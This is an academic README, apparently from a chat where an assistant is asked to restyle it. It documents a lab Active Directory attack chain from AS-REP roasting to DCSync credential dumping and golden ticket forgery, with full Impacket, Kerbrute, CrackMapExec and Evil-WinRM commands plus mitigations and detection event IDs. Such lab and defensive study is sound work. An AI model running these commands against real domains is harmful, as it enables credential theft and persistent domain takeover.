🔴 Active Directory Attack Chain
AS-REP Roasting → Full Domain Compromise

🎓 Academic Security Research Project
Secure Computer Networks Module — UWE Bristol × The British College
👨‍💻 Author: Ajaj Ahmed
📅 Date: April 2026

⚠️ Disclaimer

This research was performed in a fully isolated VMware lab environment for academic and defensive cybersecurity purposes only.

All attack techniques demonstrated are publicly documented within the MITRE ATT&CK framework and were executed against systems owned and configured specifically for this project.

🚫 Unauthorized testing against systems without explicit permission is illegal and unethical.

📖 Project Overview

This project demonstrates a complete Active Directory compromise chain starting from zero credentials and ending in full domain dominance through a single Kerberos misconfiguration.

No malware.
No phishing.
No zero-days.

Only native Windows authentication weaknesses and offensive security tooling.

The research maps every phase to the MITRE ATT&CK framework while also providing defensive recommendations, detection opportunities, and mitigation strategies relevant to real-world enterprise environments.

⚔️ Attack Chain
Reconnaissance
      ↓
User Enumeration
      ↓
AS-REP Roasting
      ↓
Offline Password Cracking
      ↓
Credential Validation
      ↓
Remote Code Execution
      ↓
Domain Reconnaissance
      ↓
DCSync Credential Dumping
      ↓
Golden Ticket Persistence
🧠 MITRE ATT&CK Mapping
Phase	Technique	MITRE ID	Tool Used
Reconnaissance	Network Service Discovery	T1046	Nmap
User Enumeration	Domain Account Discovery	T1087.002	Kerbrute
AS-REP Roasting	Steal Kerberos Tickets	T1558.004	GetNPUsers.py
Password Cracking	Password Cracking	T1110.002	John the Ripper
Credential Validation	Valid Accounts	T1078	CrackMapExec
Remote Code Execution	Service Execution	T1569.002	psexec.py
Fileless Execution	Windows Management Instrumentation	T1047	wmiexec.py
Interactive Shell Access	WinRM Remote Services	T1021.006	Evil-WinRM
Domain Recon	Account Discovery	T1087.002	lookupsid.py
Credential Dumping	NTDS Credential Dumping	T1003.003	secretsdump.py
Persistence	Golden Ticket Forgery	T1558.001	ticketer.py
🖥️ Lab Environment
Component	Configuration
Domain Controller	Windows Server 2019 (DC01)
Domain	cyberlab_aj.local
Attacker Machine	Kali Linux
Network	Isolated VMware Host-Only Network
Subnet	192.168.10.0/24
Key Vulnerability	DONT_REQ_PREAUTH Enabled
Toolkit	Impacket, Kerbrute, CME, Evil-WinRM
🔍 Key Findings

✅ A single Kerberos pre-authentication misconfiguration enabled the entire compromise chain.

✅ The Administrator password was cracked in under 4 seconds using rockyou.txt.

✅ Achieved NT AUTHORITY\SYSTEM privileges on the Domain Controller.

✅ Extracted all domain credential hashes through DCSync.

✅ Forged a Golden Ticket using the krbtgt hash for long-term persistence.

🚀 Attack Walkthrough
1️⃣ Reconnaissance
nmap -sC -sV -Pn -T4 192.168.10.0/24
crackmapexec smb 192.168.10.1
enum4linux -a 192.168.10.1
2️⃣ Kerberos User Enumeration
kerbrute userenum --dc 192.168.10.1 -d cyberlab_aj.local user.txt
3️⃣ AS-REP Roasting
GetNPUsers.py cyberlab_aj.local/ -userfile user.txt -dc-ip 192.168.10.1
4️⃣ Offline Password Cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
5️⃣ Credential Validation
crackmapexec smb 192.168.10.1 -u administrator -p passw0rd123
6️⃣ Remote Code Execution
SYSTEM Shell via PSExec
psexec.py cyberlab_aj.local/administrator:passw0rd123@192.168.10.1
Fileless Execution via WMI
wmiexec.py administrator@192.168.10.1
Interactive PowerShell via Evil-WinRM
evil-winrm -i 192.168.10.1 -u administrator -p passw0rd123
7️⃣ DCSync Credential Dumping
secretsdump.py cyberlab_aj.local/administrator:passw0rd123@192.168.10.1
8️⃣ Golden Ticket Forgery
ticketer.py -nthash 7852ec8a08f1cd1148746a4a70094728 \
-domain cyberlab_aj.local \
-domain-sid S-1-5-21-4007825111-4007869598-2199398647 \
administrator
🛡️ Defensive Mitigations
Priority	Mitigation	Security Impact
🔴 Critical	Enable Kerberos Pre-Authentication	Prevents AS-REP Roasting
🔴 Critical	Strong Password Policy + MFA	Mitigates password cracking
🟠 High	Restrict DCSync Permissions	Prevents credential dumping
🟠 High	AD Tiering & Segmentation	Reduces attack blast radius
🟡 Medium	Disable NTLM / RC4	Strengthens Kerberos security
🟡 Medium	SIEM + Sysmon Monitoring	Improves detection visibility
📊 Detection Opportunities
Event ID	Detection Use Case
4768	Suspicious Kerberos AS-REQ activity
4662	DCSync replication attempts
7045	Malicious service creation (PSExec)
4624	Suspicious SMB / WinRM logons
📁 Repository Structure
├── README.md
├── report/
│   └── AD_Attack_Chain_Report.docx
├── screenshots/
│   └── Lab evidence and outputs
└── resources/
    └── user_wordlist_template.txt
📚 References
MITRE ATT&CK — Kerberos Ticket Attacks
MITRE ATT&CK — Credential Dumping
Microsoft Active Directory Security Guidance
Impacket Toolkit
BloodHound AD Analysis
👨‍💻 Author
Ajaj Ahmed

🎓 BSc Cyber Security & Digital Forensics
🏫 University of the West of England (UWE Bristol) × The British College
📍 Kathmandu, Nepal

⭐ Project Highlights
Active Directory Exploitation
Kerberos Abuse
Red Team Methodology
MITRE ATT&CK Mapping
Defensive Security Analysis
Windows Enterprise Security Research

This repository is part of academic coursework and cybersecurity research conducted within a controlled virtual lab environment.

CAN WE MAKE IT MORE ATTRACTIVE 

Absolutely — for GitHub, the best READMEs usually combine:

🚀 Clean visual hierarchy
🛡️ Security-themed styling
📊 Badges & stats
🧠 Technical credibility
⚡ Recruiter-friendly presentation
🎯 Easy navigation

Here’s how you can make it look significantly more professional and eye-catching.

🔴 Active Directory Attack Chain
AS-REP Roasting → Full Domain Compromise
<p align="center"> <img src="https://img.shields.io/badge/Platform-Windows_Server_2019-blue?style=for-the-badge"> <img src="https://img.shields.io/badge/Attack-Kerberos_Abuse-red?style=for-the-badge"> <img src="https://img.shields.io/badge/Focus-Active_Directory-darkred?style=for-the-badge"> <img src="https://img.shields.io/badge/MITRE-ATT%26CK-black?style=for-the-badge"> </p> <p align="center"> <img src="https://img.shields.io/badge/Environment-VMware_Lab-success?style=flat-square"> <img src="https://img.shields.io/badge/Privilege-Domain_Admin-critical?style=flat-square"> <img src="https://img.shields.io/badge/Persistence-Golden_Ticket-orange?style=flat-square"> <img src="https://img.shields.io/badge/Research-Academic-purple?style=flat-square"> </p>
🧠 Project Overview

A complete Active Directory attack chain demonstrating how a single Kerberos misconfiguration can escalate into full domain compromise.

This project simulates a real-world enterprise attack scenario inside a fully isolated VMware lab environment using industry-standard offensive security tools.

The attack begins with:

✅ Zero credentials
✅ No malware
✅ No phishing
✅ No exploits

And ends with:

🔥 Domain Administrator access
🔥 DCSync credential dumping
🔥 Golden Ticket persistence

⚔️ Attack Flow
🎯 MITRE ATT&CK Mapping
Phase	Technique	MITRE ID	Tool
🔍 Recon	Network Discovery	T1046	Nmap
👤 Enumeration	Domain Account Discovery	T1087.002	Kerbrute
🎫 Kerberos Abuse	AS-REP Roasting	T1558.004	GetNPUsers.py
🔓 Password Attack	Password Cracking	T1110.002	John
✅ Validation	Valid Accounts	T1078	CrackMapExec
💻 RCE	Service Execution	T1569.002	PSExec
⚡ Fileless RCE	WMI Execution	T1047	WMIExec
🖥️ Shell Access	WinRM	T1021.006	Evil-WinRM
🧬 Credential Dumping	DCSync	T1003.003	secretsdump.py
👑 Persistence	Golden Ticket	T1558.001	ticketer.py
🖥️ Lab Environment
Domain: cyberlab_aj.local
DC: Windows Server 2019
Attacker: Kali Linux
Network: 192.168.10.0/24
Hypervisor: VMware Workstation
Vulnerability: DONT_REQ_PREAUTH
🔥 Key Findings
Finding	Result
Root Cause	Kerberos Pre-Authentication Disabled
Initial Access	AS-REP Roasting
Crack Time	< 4 Seconds
Privilege Level	NT AUTHORITY\SYSTEM
Persistence	Golden Ticket
Credential Access	Full NTDS Extraction
🚀 Attack Demonstration
🔍 Reconnaissance
nmap -sC -sV -Pn -T4 192.168.10.0/24
enum4linux -a 192.168.10.1
crackmapexec smb 192.168.10.1
👤 User Enumeration
kerbrute userenum --dc 192.168.10.1 \
-d cyberlab_aj.local user.txt
🎫 AS-REP Roasting
GetNPUsers.py cyberlab_aj.local/ \
-userfile user.txt \
-dc-ip 192.168.10.1
🔓 Password Cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
💻 Remote Code Execution
psexec.py cyberlab_aj.local/administrator:password@192.168.10.1
wmiexec.py administrator@192.168.10.1
evil-winrm -i 192.168.10.1 \
-u administrator \
-p password
🧬 DCSync Attack
secretsdump.py cyberlab_aj.local/administrator:password@192.168.10.1
👑 Golden Ticket Persistence
ticketer.py -nthash <KRBTGT_HASH> \
-domain cyberlab_aj.local \
-domain-sid <DOMAIN_SID> administrator
🛡️ Defensive Recommendations
Priority	Mitigation
🔴 Critical	Enable Kerberos Pre-Authentication
🔴 Critical	Strong Password Policy + MFA
🟠 High	Restrict DCSync Permissions
🟠 High	Tiered Administration
🟡 Medium	Disable NTLM & RC4
🟡 Medium	Deploy SIEM + Sysmon
📊 Detection Opportunities
Event ID	Description
4768	Suspicious Kerberos Requests
4662	DCSync Replication Activity
7045	PSExec Service Creation
4624	Remote SMB/WinRM Logons
📁 Repository Structure
.
├── README.md
├── report/
│   └── AD_Attack_Chain_Report.docx
├── screenshots/
├── tools/
├── resources/
└── evidence/
📸 Recommended Additions

To make the repository even stronger, add:

📷 Screenshots of attack stages
🗺️ AD lab network diagram
📊 BloodHound graphs
🎥 GIF demo walkthroughs
🧾 Detection Sigma rules
📑 IOC & detection notes
🧰 Tools Used
<p align="left"> <img src="https://skillicons.dev/icons?i=linux,bash,powershell,github,vscode" /> </p>
Nmap
Impacket
CrackMapExec
Evil-WinRM
Kerbrute
John the Ripper
BloodHound
👨‍💻 Author
Ajaj Ahmed

🎓 BSc Cyber Security & Digital Forensics
🏫 UWE Bristol × The British College
📍 Kathmandu, Nepal

🔐 SOC Analyst Learner | Active Directory Security | Threat Detection | Red Team Labs

⭐ If You Found This Useful

Give the repository a ⭐ and connect with me on GitHub or LinkedIn.

⚠️ This project was performed entirely in a controlled virtual lab environment for academic research and defensive cybersecurity education.
